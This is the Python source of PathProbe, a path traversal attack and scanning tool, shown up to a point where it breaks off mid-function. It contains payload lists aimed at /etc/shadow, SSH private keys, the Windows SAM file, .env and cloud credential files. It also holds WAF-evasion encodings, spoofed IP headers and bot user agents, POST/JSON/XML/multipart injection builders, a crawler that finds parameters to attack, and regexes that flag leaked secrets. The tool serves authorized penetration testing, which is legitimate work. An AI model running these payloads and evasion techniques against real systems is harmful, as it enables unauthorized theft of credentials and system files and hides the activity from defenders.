#!/usr/bin/env python3
"""
PathProbe v2.0 - Path Traversal Testing Tool
Features: POST body fuzzing, advanced WAF bypass, multipart/JSON/XML injection
For authorized security testing only.
"""

import argparse
import json
import csv
import sys
import time
import random
import base64
import hashlib
import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import difflib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from datetime import datetime
from typing import Optional, List, Dict

# ─────────────────────────────────────────────
#  ANSI COLORS
# ─────────────────────────────────────────────
R    = "\033[91m"
G    = "\033[92m"
Y    = "\033[93m"
B    = "\033[94m"
M    = "\033[95m"
C    = "\033[96m"
W    = "\033[97m"
DIM  = "\033[2m"
BOLD = "\033[1m"
RST  = "\033[0m"

BANNER = f"""
{R}██████╗  █████╗ ████████╗██╗  ██╗
{Y}██╔══██╗██╔══██╗╚══██╔══╝██║  ██║
{G}██████╔╝███████║   ██║   ███████║
{C}██╔═══╝ ██╔══██║   ██║   ██╔══██║
{B}██║     ██║  ██║   ██║   ██║  ██║
{M}╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝{RST}
{DIM}██████╗ ██████╗  ██████╗ ██████╗ ███████╗
{DIM}██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
{DIM}██████╔╝██████╔╝██║   ██║██████╔╝█████╗
{DIM}██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝
{DIM}██║     ██║  ██║╚██████╔╝██████╔╝███████╗
{DIM}╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝{RST}

  {W}Path Traversal Testing Tool{RST}  {DIM}v2.0 | POST Fuzzing + WAF Bypass{RST}
  {'─'*54}
"""

# ─────────────────────────────────────────────
#  PAYLOAD DATABASE
# ─────────────────────────────────────────────
PAYLOADS = {
    "classic": [
        "../../../etc/passwd",
        "../../etc/passwd",
        "../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../proc/version",
        "../../../proc/self/cmdline",
        "../../../var/log/apache2/access.log",
        "../../../var/log/apache2/error.log",
        "../../../var/log/nginx/access.log",
        "../../../var/log/auth.log",
        "../../../home/user/.ssh/id_rsa",
        "../../../home/ubuntu/.bash_history",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "..\\inetpub\\wwwroot\\web.config",
        "..\\..\\..\\windows\\system32\\config\\SAM",
    ],
    "url_encoded": [
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
    ],
    "double_encoded": [
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%252e%252e/%252e%252e/etc/passwd",
        "..%255c..%255cwindows%255cwin.ini",
        "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
    ],
    "unicode": [
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "\u002e\u002e/\u002e\u002e/etc/passwd",
        "..%u2215..%u2215etc%u2215passwd",
        "..%uEFC8..%uEFC8etc%uEFC8passwd",
        "..%u002f..%u002fetc%u002fpasswd",
    ],
    "filter_bypass": [
        "....//....//etc/passwd",
        "....\\\\....\\\\windows\\\\win.ini",
        ".././.././etc/passwd",
        "..\\..\\.\\windows\\win.ini",
        "..///////..////..//////etc/passwd",
        "/etc/passwd",
        "\\etc\\passwd",
        "/./././etc/passwd",
        "..%00/..%00/etc/passwd",
        "..%0d/..%0d/etc/passwd",
        "..%0a/..%0a/etc/passwd",
        "../;/../etc/passwd",
        "..%23/../etc/passwd",
    ],
    "null_byte": [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd\x00",
        "../../../etc/passwd\x00.txt",
        "../../../etc/passwd%00.html",
    ],
    "web_configs": [
        "../../.env",
        "../.env",
        "../../config.php",
        "../config.php",
        "../../database.yml",
        "../../wp-config.php",
        "../wp-config.php",
        "../../configuration.php",
        "../../config/database.php",
        "../../application/config/database.php",
        "../../sites/default/settings.php",
        "../../../web.config",
        "../../appsettings.json",
        "../../.git/config",
        "../../.git/HEAD",
        "../../.htpasswd",
        "../../.htaccess",
        "../../config/secrets.yml",
        "../../storage/logs/laravel.log",
    ],
    "path_normalization": [
        "..././..././etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/%5C../%5C../etc/passwd",
        "/..%2F..%2Fetc/passwd",
        "/.%2e/.%2e/etc/passwd",
        "/%2e%2e/%2e%2e/etc/passwd",
        "../%2e./etc/passwd",
        "%2e./%2e./etc/passwd",
        ".%2e/.%2e/etc/passwd",
    ],
    "truncation": [
        "../" * 20 + "etc/passwd",
        "..\\" * 20 + "windows\\win.ini",
        "A" * 200 + "/../../../etc/passwd",
        "../" * 15 + "etc/shadow",
    ],
    "archive_traversal": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/crontab",
        "../../.ssh/authorized_keys",
        "../../root/.ssh/authorized_keys",
    ],
}

# ─────────────────────────────────────────────
#  WAF BYPASS ENGINE
# ─────────────────────────────────────────────

def waf_case_variation(payload):
    return payload.replace("etc", "EtC").replace("passwd", "PaSsWd").replace("windows", "WiNdOwS")

def waf_insert_null(payload):
    return payload.replace("../", "..%00/").replace("etc", "e%00tc")

def waf_path_comment(payload):
    return payload.replace("../", ".%09./").replace("/etc/", "/%09etc/")

def waf_tab_newline(payload):
    return payload.replace("/", "%09/").replace("../", "..%0a/")

def waf_overlong_utf8(payload):
    return payload.replace("/", "%c0%af").replace("../", "..%c0%af")

def waf_double_slash(payload):
    return payload.replace("../", ".././").replace("/etc/", "//etc//")

def waf_unicode_normalization(payload):
    return payload.replace("/", "\u2215").replace("\\", "\u29f5")

def waf_reverse_proxy_headers(headers):
    h = dict(headers)
    h.update({
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "localhost",
        "Forwarded": "for=127.0.0.1;host=localhost;proto=https",
        "True-Client-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
    })
    return h

def waf_useragent_rotation():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/7.88.1",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
    ]
    return random.choice(agents)

WAF_TRANSFORMS = {
    "case_variation":        waf_case_variation,
    "overlong_utf8":         waf_overlong_utf8,
    "tab_newline":           waf_tab_newline,
    "double_slash":          waf_double_slash,
    "insert_null":           waf_insert_null,
    "path_comment":          waf_path_comment,
    "unicode_normalization": waf_unicode_normalization,
}

def apply_waf_bypass(payload, techniques):
    if "all" in techniques:
        techniques = list(WAF_TRANSFORMS.keys())
    variants = []
    for tech in techniques:
        fn = WAF_TRANSFORMS.get(tech)
        if fn:
            mutated = fn(payload)
            if mutated != payload:
                variants.append((tech, mutated))
    return variants

# ─────────────────────────────────────────────
#  POST BODY BUILDERS
# ─────────────────────────────────────────────

def build_post_form(param, payload, **kwargs):
    body = urllib.parse.urlencode({param: payload}).encode()
    return body, {"Content-Type": "application/x-www-form-urlencoded"}

def build_post_json(param, payload, json_template=None, **kwargs):
    try:
        data = json.loads(json_template) if json_template else {}
    except Exception:
        data = {}
    keys = param.split(".")
    node = data
    for k in keys[:-1]:
        node = node.setdefault(k, {})
    node[keys[-1]] = payload
    return json.dumps(data).encode(), {"Content-Type": "application/json"}

def build_post_json_array(param, payload, **kwargs):
    data = {param: [payload, "normal_value"]}
    return json.dumps(data).encode(), {"Content-Type": "application/json"}

def build_post_xml(param, payload, **kwargs):
    xml = f'<?xml version="1.0" encoding="UTF-8"?>\n<request>\n  <{param}>{payload}</{param}>\n  <action>view</action>\n</request>'
    return xml.encode(), {"Content-Type": "application/xml"}

def build_post_multipart(param, payload, filename_inject=False, **kwargs):
    boundary = "----PathProbe" + hashlib.md5(payload.encode()).hexdigest()[:12]
    if filename_inject:
        part = (f'--{boundary}\r\nContent-Disposition: form-data; name="{param}"; '
                f'filename="{payload}"\r\nContent-Type: application/octet-stream\r\n\r\nPATHPROBE_TEST\r\n')
    else:
        part = f'--{boundary}\r\nContent-Disposition: form-data; name="{param}"\r\n\r\n{payload}\r\n'
    body = (part + f'--{boundary}--\r\n').encode()
    return body, {"Content-Type": f"multipart/form-data; boundary={boundary}"}

def build_post_graphql(param, payload, **kwargs):
    gql = json.dumps({
        "query": f'{{ file({param}: "{payload}") {{ content }} }}',
        "variables": {param: payload}
    })
    return gql.encode(), {"Content-Type": "application/json"}

POST_MODES = {
    "form":       build_post_form,
    "json":       build_post_json,
    "json_array": build_post_json_array,
    "xml":        build_post_xml,
    "multipart":  build_post_multipart,
    "graphql":    build_post_graphql,
}

# ─────────────────────────────────────────────
#  DETECTION SIGNATURES
# ─────────────────────────────────────────────
SIGNATURES = {
    "linux_passwd":    {"pattern": r"root:x:0:0|root:[^:]*:[0-9]+:[0-9]+",            "description": "/etc/passwd exposed",        "severity": "CRITICAL", "os": "Linux"},
    "linux_shadow":    {"pattern": r"root:\$[0-9a-z]\$|root:\*:",                      "description": "/etc/shadow exposed",        "severity": "CRITICAL", "os": "Linux"},
    "linux_hosts":     {"pattern": r"127\.0\.0\.1\s+localhost|::1\s+localhost",         "description": "/etc/hosts exposed",         "severity": "HIGH",     "os": "Linux"},
    "linux_proc_env":  {"pattern": r"HOME=/|PATH=/usr|HOSTNAME=|USER=",                "description": "/proc/self/environ exposed",  "severity": "CRITICAL", "os": "Linux"},
    "linux_proc_ver":  {"pattern": r"Linux version [0-9]+\.[0-9]+",                    "description": "/proc/version exposed",      "severity": "HIGH",     "os": "Linux"},
    "linux_crontab":   {"pattern": r"#\s*m h dom mon dow|SHELL=/bin/",                "description": "crontab file exposed",       "severity": "HIGH",     "os": "Linux"},
    "ssh_private_key": {"pattern": r"-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----",   "description": "SSH private key exposed",    "severity": "CRITICAL", "os": "Linux"},
    "bash_history":    {"pattern": r"sudo |ssh |mysql |psql |curl |wget ",             "description": "bash_history exposed",       "severity": "HIGH",     "os": "Linux"},
    "windows_ini":     {"pattern": r"\[fonts\]|\[extensions\]|\[mci extensions\]",    "description": "Windows win.ini exposed",    "severity": "HIGH",     "os": "Windows"},
    "windows_boot":    {"pattern": r"\[boot loader\]|multi\(0\)disk\(0\)",             "description": "Windows boot.ini exposed",   "severity": "HIGH",     "os": "Windows"},
    "windows_sam":     {"pattern": r"Administrator:500:|Guest:501:",                   "description": "Windows SAM file exposed",   "severity": "CRITICAL", "os": "Windows"},
    "web_config":      {"pattern": r"<configuration>|<connectionStrings>|<appSettings>","description": "web.config exposed",        "severity": "CRITICAL", "os": "Windows"},
    "env_file":        {"pattern": r"DB_PASSWORD=|APP_KEY=|SECRET_KEY=|API_KEY=|DATABASE_URL=|JWT_SECRET=","description": ".env file exposed","severity":"CRITICAL","os":"Any"},
    "php_config":      {"pattern": r"\$db_password\s*=|define\('DB_PASSWORD'|'password'\s*=>\s*'","description": "PHP config exposed","severity":"CRITICAL","os":"Any"},
    "apache_log":      {"pattern": r'"[A-Z]+ /[^\s]+ HTTP/',                           "description": "Apache/Nginx log exposed",   "severity": "HIGH",     "os": "Linux"},
    "appsettings":     {"pattern": r'"ConnectionStrings"|"DefaultConnection"',          "description": "appsettings.json exposed",   "severity": "CRITICAL", "os": "Windows"},
    "git_config":      {"pattern": r"\[core\]\s*repositoryformatversion|\[remote",      "description": ".git/config exposed",       "severity": "HIGH",     "os": "Any"},
    "git_head":        {"pattern": r"ref: refs/heads/",                                 "description": ".git/HEAD exposed",         "severity": "MEDIUM",   "os": "Any"},
    "laravel_log":     {"pattern": r"\[20[0-9]{2}-[0-9]{2}-[0-9]{2}.*local\]",         "description": "Laravel log exposed",       "severity": "HIGH",     "os": "Any"},
    "aws_creds":       {"pattern": r"aws_access_key_id|aws_secret_access_key",          "description": "AWS credentials exposed",   "severity": "CRITICAL", "os": "Any"},
    "django_settings": {"pattern": r"DJANGO_SECRET_KEY|DATABASES\s*=\s*\{",            "description": "Django settings exposed",    "severity": "CRITICAL", "os": "Any"},
    "rails_secrets":   {"pattern": r"secret_key_base:|production:\s*secret",            "description": "Rails secrets exposed",     "severity": "CRITICAL", "os": "Any"},
    "htpasswd":        {"pattern": r"[a-zA-Z0-9_]+:\$apr1\$|[a-zA-Z0-9_]+:\{SHA\}",   "description": ".htpasswd file exposed",    "severity": "CRITICAL", "os": "Any"},
}

# ─────────────────────────────────────────────
#  ERROR-BASED DETECTION SIGNATURES
# ─────────────────────────────────────────────
# Matches framework/OS error messages that leak the attempted file path.
# A hit proves traversal was attempted server-side even if file content
# is not returned (blind traversal).
ERROR_SIGNATURES = {
    "no_such_file":      r"No such file or directory",
    "failed_open":       r"failed to open stream",
    "open_basedir":      r"open_basedir restriction in effect",
    "include_failed":    r"include\(\).*Failed opening|require\(\).*Failed opening",
    "file_get_contents": r"Warning.*file_get_contents|file_get_contents\(.*\).*failed",
    "fopen_warning":     r"Warning.*fopen\(|fopen\(.*\).*failed",
    "java_fnf":          r"java\.io\.FileNotFoundException",
    "dotnet_fnf":        r"System\.IO\.FileNotFoundException|Could not find file",
    "access_denied":     r"Access is denied|Access denied",
    "permission_denied": r"Permission denied",
    "path_disclosed":    r"(fopen|file_get_contents|include|require)\s*\(['\"]?(/[a-z/]+|[A-Z]:\\\\)",
    "ruby_errno":        r"Errno::ENOENT|No such file or directory.*\.rb",
    "python_ioerror":    r"\[Errno 2\] No such file or directory",
    "nodejs_enoent":     r"ENOENT.*no such file or directory",
    "iis_error":         r"The system cannot find the (file|path) specified",
}

# ─────────────────────────────────────────────
#  HTTP REQUEST ENGINE
# ─────────────────────────────────────────────
class _RateLimiter:
    """Thread-safe token-bucket rate limiter.
    All threads share one instance; each call to acquire() blocks
    until at least (1/rate) seconds have passed since the last call.
    """
    def __init__(self, rate: float):
        self._interval = 1.0 / max(rate, 0.001)
        self._lock     = threading.Lock()
        self._last     = 0.0

    def acquire(self):
        with self._lock:
            now  = time.time()
            wait = self._interval - (now - self._last)
            if wait > 0:
                time.sleep(wait)
            self._last = time.time()


def make_request(url, method="GET", headers=None, cookies=None, param=None,
                 payload=None, post_body=None, extra_headers=None,
                 timeout=10, verify_ssl=True,
                 retries=0, _rate_lim=None, _verbose=False):
    """
    Send an HTTP request with optional rate-limiting and retry logic.

    Retry policy:
      - Retries only on network/timeout errors (NOT on valid HTTP responses).
      - Back-off: sleep(0.5 * attempt) between retries.
    """
    headers = dict(headers or {})
    if extra_headers:
        headers.update(extra_headers)
    headers.setdefault("User-Agent", waf_useragent_rotation())
    if cookies:
        headers["Cookie"] = cookies

    final_url = url
    if method == "GET" and param and payload:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        final_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()

    ctx = ssl.create_default_context()
    if not verify_ssl:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(final_url, headers=headers, method=method, data=post_body)

    for attempt in range(retries + 1):
        if _rate_lim:
            _rate_lim.acquire()
        try:
            start = time.time()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                elapsed = time.time() - start
                body = resp.read().decode("utf-8", errors="replace")
                return {"status": resp.status, "headers": dict(resp.headers),
                        "body": body, "length": len(body),
                        "elapsed": round(elapsed, 3), "url": final_url}
        except urllib.error.HTTPError as e:
            # Valid HTTP response ─ return immediately, never retry
            elapsed = time.time() - start
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            return {"status": e.code,
                    "headers": dict(e.headers) if e.headers else {},
                    "body": body, "length": len(body),
                    "elapsed": round(elapsed, 3), "url": final_url}
        except Exception:
            if attempt < retries:
                if _verbose:
                    print(f"  {Y}[RETRY] Attempt {attempt + 2}/{retries + 1} — {final_url[:60]}{RST}")
                time.sleep(0.5 * (attempt + 1))
                continue
    return None

# ─────────────────────────────────────────────
#  DETECTION ENGINE
# ─────────────────────────────────────────────
def _similarity_score(a: str, b: str) -> float:
    """
    Return a 0.0–1.0 similarity ratio between two response bodies.
    Uses difflib.SequenceMatcher with autojunk disabled for accuracy
    on short-to-medium payloads. Truncates both strings to 8 KB so
    large responses don’t create measurable scan-time overhead.
    """
    a = a[:8192]
    b = b[:8192]
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a, b, autojunk=False).ratio()


def analyze_response(response, baseline_length=0, baseline_body="", verbose=False):
    """
    Core detection engine.

    Detection layers (applied in order, escalating confidence):
      1. SIGNATURES    — known file-content patterns  → HIGH / MEDIUM
      2. ERROR_SIGNATURES — server error messages      → MEDIUM (blind detection)
      3. Similarity    — difflib ratio vs baseline     → LOW / MEDIUM
      4. Size anomaly  — length 1.5× baseline          → LOW
    """
    if not response:
        return {
            "vulnerable": False, "confidence": "NONE", "matches": [],
            "similarity_score": 1.0, "error_detected": False,
            "size_anomaly": False, "status": 0, "length": 0,
        }

    body   = response.get("body", "")
    status = response.get("status", 0)
    length = response.get("length", 0)

    # ── Layer 1: content signature matching ──
    matches = []
    for sig_name, sig in SIGNATURES.items():
        if re.search(sig["pattern"], body, re.IGNORECASE | re.MULTILINE):
            matches.append({
                "signature":   sig_name,
                "description": sig["description"],
                "severity":    sig["severity"],
                "os":          sig["os"],
            })

    # ── Layer 2: error-based detection ──
    error_detected  = False
    error_signatures_hit = []
    for err_name, pattern in ERROR_SIGNATURES.items():
        if re.search(pattern, body, re.IGNORECASE | re.MULTILINE):
            error_detected = True
            error_signatures_hit.append(err_name)

    # ── Layer 3: similarity vs baseline ──
    sim_score = _similarity_score(baseline_body, body) if baseline_body else 1.0
    if verbose and baseline_body:
        label = "LOW" if sim_score < 0.70 else ("MEDIUM" if sim_score < 0.90 else "HIGH")
        print(f"  {DIM}[SIMILARITY] Score: {sim_score:.2f} ({label}){RST}")

    # ── Layer 4: size anomaly ──
    size_anomaly = baseline_length > 0 and length > baseline_length * 1.5 and length > 200

    # ── Confidence resolution (highest layer wins) ──
    if matches:
        severities = [m["severity"] for m in matches]
        confidence = "HIGH" if "CRITICAL" in severities else "MEDIUM"
        vulnerable = True
    elif error_detected:
        # Error seen — traversal attempted but file may be inaccessible
        confidence = "MEDIUM"
        vulnerable = True
    elif sim_score < 0.70 and status == 200:
        # Response is very different from baseline without a known signature
        confidence = "MEDIUM"
        vulnerable = True
    elif (size_anomaly or (baseline_body and sim_score < 0.90)) and status == 200:
        confidence = "LOW"
        vulnerable = True
    else:
        confidence = "NONE"
        vulnerable = False

    return {
        "vulnerable":           vulnerable,
        "confidence":           confidence,
        "matches":              matches,
        "size_anomaly":         size_anomaly,
        "similarity_score":     round(sim_score, 4),
        "error_detected":       error_detected,
        "error_signatures_hit": error_signatures_hit,
        "status":               status,
        "length":               length,
    }

# ─────────────────────────────────────────────
#  WORDLIST LOADER
# ─────────────────────────────────────────────
def load_wordlist(path):
    """
    Load payloads from an external wordlist file.
      - Skips blank lines and lines starting with '#'
      - Returns each payload exactly as-is (no encoding, no normalization)
      - Deduplicates while preserving insertion order
    """
    import os
    if not os.path.isfile(path):
        print(f"{R}[!] ERROR: Wordlist file not found: {path}{RST}")
        sys.exit(1)

    seen, result = set(), []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                entry = line.rstrip("\r\n")
                if not entry or entry.startswith("#"):
                    continue
                if entry not in seen:
                    seen.add(entry)
                    result.append(entry)
    except OSError as exc:
        print(f"{R}[!] ERROR: Cannot read wordlist '{path}': {exc}{RST}")
        sys.exit(1)

    if not result:
        print(f"{Y}[!] WARNING: Wordlist '{path}' is empty — no extra payloads loaded{RST}")
    else:
        print(f"{C}[*] Loaded {BOLD}{len(result)}{RST}{C} payloads from external wordlist: {DIM}{path}{RST}")

    return result


# ─────────────────────────────────────────────
#  RECON ENGINE — Crawler + Param Discovery
# ─────────────────────────────────────────────
STATIC_EXTENSIONS = {
    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico", ".webp",
    ".css", ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".mp3", ".mp4", ".avi", ".mov", ".pdf", ".zip", ".gz",
}

# Slight name-based boost — never enough alone to reach HIGH
FILE_PARAM_HINTS = {
    "file", "path", "page", "template", "doc", "download",
    "view", "load", "dir", "folder", "resource", "include",
    "src", "filename", "filepath", "module", "target", "name",
}


class _LinkParser(HTMLParser):
    """Fast HTML parser that extracts links, form actions, and input names."""
    def __init__(self, base_url):
        super().__init__()
        self.base   = base_url
        self.links  = set()
        self.inputs = []       # list of (form_action, method, [input_names])
        self._cur_form   = None
        self._cur_inputs = []

    def _abs(self, url):
        return urllib.parse.urljoin(self.base, url)

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "a" and "href" in d:
            self.links.add(self._abs(d["href"]))
        elif tag == "link" and "href" in d:
            self.links.add(self._abs(d["href"]))
        elif tag == "script" and "src" in d:
            self.links.add(self._abs(d["src"]))
        elif tag == "form":
            self._cur_form   = self._abs(d.get("action", ""))
            self._cur_inputs = []
        elif tag == "input" and "name" in d:
            self._cur_inputs.append(d["name"])
        elif tag == "select" and "name" in d:
            self._cur_inputs.append(d["name"])
        elif tag == "textarea" and "name" in d:
            self._cur_inputs.append(d["name"])

    def handle_endtag(self, tag):
        if tag == "form" and self._cur_form is not None:
            method = "POST"  # default for forms
            self.inputs.append((self._cur_form, method, list(self._cur_inputs)))
            self._cur_form   = None
            self._cur_inputs = []


def _is_static(url):
    path = urllib.parse.urlparse(url).path.lower()
    return any(path.endswith(ext) for ext in STATIC_EXTENSIONS)


def _same_domain(base, url):
    return urllib.parse.urlparse(base).netloc == urllib.parse.urlparse(url).netloc


def _strip_fragment(url):
    p = urllib.parse.urlparse(url)
    return urllib.parse.urlunparse(p._replace(fragment=""))


def crawl_target(base_url, max_depth=2, max_urls=1000,
                 timeout=10, verify_ssl=True, verbose=False):
    """
    BFS crawler.  Returns set of discovered URLs (same-domain, no static).
    """
    visited  = set()
    queue    = [(_strip_fragment(base_url), 0)]
    visited.add(_strip_fragment(base_url))

    print(f"\n{C}[~] Crawling {base_url}  (depth={max_depth}, max={max_urls})...{RST}")

    while queue and len(visited) < max_urls:
        url, depth = queue.pop(0)
        if depth > max_depth:
            continue
        if _is_static(url):
            continue

        resp = make_request(url, timeout=timeout, verify_ssl=verify_ssl)
        if not resp or resp["status"] >= 400:
            continue

        body = resp.get("body", "")
        ct   = resp.get("headers", {}).get("Content-Type", "")

        # HTML parsing
        if "html" in ct.lower() or body.strip().startswith("<"):
            try:
                parser = _LinkParser(url)
                parser.feed(body)
                for link in parser.links:
                    link = _strip_fragment(link)
                    if link not in visited and _same_domain(base_url, link):
                        visited.add(link)
                        queue.append((link, depth + 1))
            except Exception:
                pass

        # JS regex for urls  (basic inline extraction)
        for m in re.findall(r'["\'](/[a-zA-Z0-9_./-]+(?:\?[^"\' ]*)?)["\']', body):
            abs_m = urllib.parse.urljoin(url, m)
            abs_m = _strip_fragment(abs_m)
            if abs_m not in visited and _same_domain(base_url, abs_m):
                visited.add(abs_m)
                queue.append((abs_m, depth + 1))

        if verbose and len(visited) % 50 == 0:
            print(f"  {DIM}[crawl] {len(visited)} URLs...{RST}")

    print(f"{G}[+] Crawl complete:{RST} {BOLD}{len(visited)}{RST} URLs discovered")
    return visited


def extract_params(urls, timeout=10, verify_ssl=True):
    """
    For each URL, extract query parameters, form inputs, and JSON keys.
    Returns a list of target dicts:
      [{"url": ..., "params": [...], "method": "GET"}, ...]
    """
    targets = []
    seen    = set()  # (url_no_qs, param_tuple) dedup

    for url in urls:
        if _is_static(url):
            continue

        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        # 1) Query-string parameters
        qs_params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
        if qs_params:
            key = (base_url, "GET", tuple(sorted(qs_params)))
            if key not in seen:
                seen.add(key)
                targets.append({"url": url, "params": qs_params, "method": "GET"})

        # 2) REST-style path parameters  (e.g. /download/file/test.txt)
        segments = [s for s in parsed.path.split("/") if s]
        if len(segments) >= 2:
            for i in range(len(segments) - 1):
                seg = segments[i].lower()
                if seg in FILE_PARAM_HINTS:
                    p_name = segments[i]
                    key = (base_url, "GET-REST", (p_name,))
                    if key not in seen:
                        seen.add(key)
                        targets.append({"url": base_url, "params": [p_name],
                                        "method": "GET", "rest_style": True})

        # 3) Fetch page for form / JSON extraction
        resp = make_request(url, timeout=timeout, verify_ssl=verify_ssl)
        if not resp:
            continue
        body = resp.get("body", "")
        ct   = resp.get("headers", {}).get("Content-Type", "")

        # Form inputs
        if "html" in ct.lower() or body.strip().startswith("<"):
            try:
                parser = _LinkParser(url)
                parser.feed(body)
                for form_url, method, input_names in parser.inputs:
                    if input_names:
                        key = (form_url, method, tuple(sorted(input_names)))
                        if key not in seen:
                            seen.add(key)
                            targets.append({"url": form_url, "params": input_names,
                                            "method": method})
            except Exception:
                pass

        # JSON top-level keys
        if "json" in ct.lower() or body.strip().startswith("{"):
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    jkeys = list(data.keys())[:20]
                    if jkeys:
                        key = (base_url, "POST-JSON", tuple(sorted(jkeys)))
                        if key not in seen:
                            seen.add(key)
                            targets.append({"url": base_url, "params": jkeys,
                                            "method": "POST"})
            except Exception:
                pass

    return targets


def prioritize_params(targets, timeout=10, verify_ssl=True, verbose=False):
    """
    Behavior-based parameter prioritization.

    For each (url, param): send 4 safe probes, compare to baseline,
    and assign a score based on response changes.

    Returns targets list with added 'priority' and 'scores' per param.
    """
    PROBES = [
        "test.txt",
        "../test",
        "/etc/passwd",
        "pathprobe_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
    ]

    print(f"\n{C}[~] Analyzing {sum(len(t['params']) for t in targets)} parameters across {len(targets)} endpoints...{RST}")

    for target in targets:
        url     = target["url"]
        method  = target["method"]
        scored  = {}  # param_name → score

        for param in target["params"]:
            score = 0

            # Baseline: original request
            bl_resp = make_request(url, timeout=timeout, verify_ssl=verify_ssl)
            if not bl_resp:
                scored[param] = 0
                continue
            bl_len  = bl_resp["length"]
            bl_stat = bl_resp["status"]
            bl_body = bl_resp["body"][:4096]

            for probe in PROBES:
                resp = make_request(
                    url, method="GET", param=param, payload=probe,
                    timeout=timeout, verify_ssl=verify_ssl
                )
                if not resp:
                    continue

                # 1) Response size change (> 20% difference)
                if bl_len > 0 and abs(resp["length"] - bl_len) / max(bl_len, 1) > 0.20:
                    score += 2

                # 2) Content similarity (difflib)
                sim = _similarity_score(bl_body, resp["body"][:4096])
                if sim < 0.70:
                    score += 2
                elif sim < 0.90:
                    score += 1

                # 3) Error-based detection
                for _, pat in ERROR_SIGNATURES.items():
                    if re.search(pat, resp["body"], re.IGNORECASE):
                        score += 2
                        break

                # 4) Reflection of probe value in response
                if probe in resp["body"]:
                    score += 1

                # 5) Status code change
                if resp["status"] != bl_stat:
                    score += 1

            # Weak heuristic boost (name hint) — max +1, never dominant
            if param.lower() in FILE_PARAM_HINTS:
                score += 1

            scored[param] = score

        # Assign priority per param
        param_priorities = {}
        for param, sc in scored.items():
            if sc >= 3:
                param_priorities[param] = "HIGH"
            elif sc >= 2:
                param_priorities[param] = "MEDIUM"
            else:
                param_priorities[param] = "LOW"

        target["scores"]     = scored
        target["priorities"] = param_priorities

        if verbose:
            for param, prio in param_priorities.items():
                pc = R if prio == "HIGH" else Y if prio == "MEDIUM" else DIM
                print(f"  {pc}{param:>20} → {prio} (score: {scored[param]}){RST}")

    return targets


def run_recon(args):
    """
    Orchestrator: crawl → extract → prioritize → return scan targets.
    """
    depth    = getattr(args, "crawl", None)
    max_urls = getattr(args, "max_urls", 1000)
    if not depth:
        return []

    urls = crawl_target(
        args.url, max_depth=depth, max_urls=max_urls,
        timeout=args.timeout, verify_ssl=not args.no_ssl_verify,
        verbose=args.verbose,
    )

    targets = extract_params(
        urls, timeout=args.timeout, verify_ssl=not args.no_ssl_verify,
    )

    if not targets:
        print(f"{Y}[!] No parameterized endpoints found during crawl{RST}")
        return []

    print(f"{G}[+] Endpoints with params:{RST} {BOLD}{len(targets)}{RST}")

    targets = prioritize_params(
        targets, timeout=args.timeout,
